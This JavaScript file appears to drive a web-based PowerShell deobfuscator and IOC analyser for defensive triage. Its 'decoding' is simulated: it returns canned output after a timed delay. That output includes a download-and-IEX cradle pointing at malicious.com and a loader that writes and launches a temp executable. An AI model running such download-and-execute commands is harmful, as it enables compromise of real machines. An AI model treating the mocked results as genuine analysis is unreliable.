document.addEventListener('DOMContentLoaded', function() {
    const psInput = document.getElementById('psInput');
    const decodePS = document.getElementById('decodePS');
    const clearAll = document.getElementById('clearAll');
    const copyDecoded = document.getElementById('copyDecoded');
    const decodedOutput = document.getElementById('decodedOutput');
    const iocAnalysis = document.getElementById('iocAnalysis');

    // Decode PowerShell
    decodePS.addEventListener('click', function() {
        const input = psInput.value.trim();
        
        if (!input) {
            alert('Please enter PowerShell command to decode.');
            return;
        }

        decodePowerShell(input);
    });

    // Clear all
    clearAll.addEventListener('click', function() {
        psInput.value = '';
        decodedOutput.value = '';
        clearResults();
    });

    // Copy decoded command
    copyDecoded.addEventListener('click', function() {
        if (decodedOutput.value) {
            decodedOutput.select();
            document.execCommand('copy');
            alert('Decoded command copied to clipboard!');
        }
    });

    // Decode PowerShell
    function decodePowerShell(input) {
        // Display analysis results (simulated)
        document.getElementById('obfuscationTechniques').textContent = 'Analyzing...';
        document.getElementById('encodedSections').textContent = 'Analyzing...';
        document.getElementById('commandType').textContent = 'Analyzing...';
        document.getElementById('payloadIndicators').textContent = 'Analyzing...';

        // Simulate decoding process
        setTimeout(function() {
            // In a real implementation, you would decode the PowerShell command
            // For demonstration, we'll simulate results
            const techniques = detectObfuscationTechniques(input);
            const encoded = detectEncodedSections(input);
            const commandType = detectCommandType(input);
            const indicators = detectPayloadIndicators(input);

            document.getElementById('obfuscationTechniques').textContent = techniques.join(', ');
            document.getElementById('encodedSections').textContent = encoded.length;
            document.getElementById('commandType').textContent = commandType;
            document.getElementById('payloadIndicators').textContent = indicators.join(', ');

            // Display security analysis
            const threatLevel = indicators.length > 0 ? 'Critical' : 'Low';
            const actionRequired = indicators.length > 0 ? 'Immediate Investigation' : 'None';
            const executionContext = 'User Context';

            document.getElementById('threatLevel').textContent = threatLevel;
            document.getElementById('actionRequired').textContent = actionRequired;
            document.getElementById('executionContext').textContent = executionContext;
            document.getElementById('recommendations').textContent = indicators.length > 0 ? 
                'Block execution, analyze in sandbox' : 'Monitor for unusual activity';

            // Generate mock decoded output
            const decoded = generateMockDecodedCommand(commandType);
            decodedOutput.value = decoded;

            // Generate mock IOC analysis
            iocAnalysis.innerHTML = '';
            const iocs = [
                { indicator: 'http://malicious.com/payload.ps1', type: 'URL', context: 'Download payload' },
                { indicator: 'IEX', type: 'Command', context: 'Execute downloaded script' },
                { indicator: 'New-Object Net.WebClient', type: 'API', context: 'Download file' }
            ];

            iocs.forEach(ioc => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${ioc.indicator}</td>
                    <td>${ioc.type}</td>
                    <td>${ioc.context}</td>
                `;
                iocAnalysis.appendChild(row);
            });
        }, 2000);
    }

    // Detect obfuscation techniques
    function detectObfuscationTechniques(input) {
        // In a real implementation, you would analyze the command
        const techniques = [];
        if (input.includes('FromBase64String')) techniques.push('Base64 Encoding');
        if (input.includes('$(') && input.includes(')')) techniques.push('Command Substitution');
        if (input.includes('+')) techniques.push('String Concatenation');
        if (input.includes('IEX') || input.includes('Invoke-Expression')) techniques.push('Invoke-Expression');
        return techniques.length > 0 ? techniques : ['None Detected'];
    }

    // Detect encoded sections
    function detectEncodedSections(input) {
        // In a real implementation, you would extract encoded sections
        const sections = [];
        const base64Regex = /[A-Za-z0-9+/]{20,}={0,2}/g;
        const matches = input.match(base64Regex);
        if (matches) {
            sections.push(...matches);
        }
        return sections;
    }

    // Detect command type
    function detectCommandType(input) {
        // In a real implementation, you would classify the command
        if (input.includes('DownloadString') || input.includes('DownloadFile')) {
            return 'Downloader';
        } else if (input.includes('Invoke-ReflectivePEInjection') || input.includes('Meterpreter')) {
            return 'Stage 2 Loader';
        } else if (input.includes('Get-Process') || input.includes('Get-WmiObject')) {
            return 'Reconnaissance';
        } else {
            return 'Unknown';
        }
    }

    // Detect payload indicators
    function detectPayloadIndicators(input) {
        // In a real implementation, you would extract indicators
        const indicators = [];
        if (input.includes('IEX') || input.includes('Invoke-Expression')) indicators.push('Code Execution');
        if (input.includes('DownloadString') || input.includes('DownloadFile')) indicators.push('File Download');
        if (input.includes('CreateThread') || input.includes('VirtualAlloc')) indicators.push('Process Injection');
        return indicators;
    }

    // Generate mock decoded command
    function generateMockDecodedCommand(type) {
        if (type === 'Downloader') {
            return `# Decoded PowerShell Downloader
$wc = New-Object System.Net.WebClient
$payload = $wc.DownloadString("http://malicious.com/payload.ps1")
IEX $payload`;
        } else if (type === 'Stage 2 Loader') {
            return `# Decoded Stage 2 Loader
$encoded = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAA..."
$bytes = [System.Convert]::FromBase64String($encoded)
[System.IO.File]::WriteAllBytes("$env:TEMP\\loader.exe", $bytes)
Start-Process "$env:TEMP\\loader.exe"`;
        } else {
            return `# Decoded PowerShell Command
Write-Host "This is a benign PowerShell command"
Get-Process | Select-Object Name, CPU`;
        }
    }

    // Clear results
    function clearResults() {
        document.getElementById('obfuscationTechniques').textContent = '-';
        document.getElementById('encodedSections').textContent = '-';
        document.getElementById('commandType').textContent = '-';
        document.getElementById('payloadIndicators').textContent = '-';
        document.getElementById('threatLevel').textContent = '-';
        document.getElementById('actionRequired').textContent = '-';
        document.getElementById('executionContext').textContent = '-';
        document.getElementById('recommendations').textContent = '-';
        document.getElementById('decodedOutput').value = '';
        iocAnalysis.innerHTML = '';
    }

    // Add Nandha's expertise insight
    function addNandhaInsight() {
        const insightCard = document.querySelector('.insight-item');
        if (insightCard) {
            insightCard.innerHTML += `
                <div class="mt-3">
                    <p class="small text-muted">
                        <i class="fas fa-user me-2"></i>
                        Expert insight by <a href="https://www.linkedin.com/in/nandha-kumar-m-952342159/" target="_blank">Nandha Kumar M</a>
                    </p>
                </div>
            `;
        }
    }

    // Initialize Nandha's insight
    addNandhaInsight();
});